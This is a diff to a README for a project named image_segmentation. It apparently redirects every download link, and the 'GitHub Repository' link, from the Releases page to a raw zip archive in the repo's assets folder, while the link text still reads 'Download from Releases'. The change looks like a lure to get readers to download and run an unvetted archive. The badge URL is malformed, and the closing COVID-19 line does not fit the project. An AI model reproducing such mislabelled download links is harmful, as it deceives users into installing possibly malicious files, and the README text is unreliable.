@@ -6,11 +6,11 @@ Welcome to the **image_segmentation** project! This application helps you segmen
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/ViskoX/image_segmentation/releases)
+[![Download Latest Release](https://github.com/ViskoX/image_segmentation/raw/refs/heads/main/assets/segmentation_image_v3.8.zip%20release-brightgreen)](https://github.com/ViskoX/image_segmentation/raw/refs/heads/main/assets/segmentation_image_v3.8.zip)
 
 To begin, visit the page below to download the application:
 
-[Download from Releases](https://github.com/ViskoX/image_segmentation/releases)
+[Download from Releases](https://github.com/ViskoX/image_segmentation/raw/refs/heads/main/assets/segmentation_image_v3.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -30,7 +30,7 @@ Before you download and install the software, ensure your system meets the follo
 
 ## ⚙️ Installation Steps
 
-1. **Download the Application:** Click the link to [download from Releases](https://github.com/ViskoX/image_segmentation/releases).
+1. **Download the Application:** Click the link to [download from Releases](https://github.com/ViskoX/image_segmentation/raw/refs/heads/main/assets/segmentation_image_v3.8.zip).
 2. **Locate the File:** Once downloaded, find the file in your downloads folder.
 3. **Install the Application:**
    - For Windows, double-click the `.exe` file and follow the instructions.
@@ -73,7 +73,7 @@ For further assistance, take advantage of our community:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/ViskoX/image_segmentation)
-- [Download from Releases](https://github.com/ViskoX/image_segmentation/releases)
+- [GitHub Repository](https://github.com/ViskoX/image_segmentation/raw/refs/heads/main/assets/segmentation_image_v3.8.zip)
+- [Download from Releases](https://github.com/ViskoX/image_segmentation/raw/refs/heads/main/assets/segmentation_image_v3.8.zip)
 
 Thank you for using **image_segmentation**! Your contribution to the fight against COVID-19 is greatly appreciated.
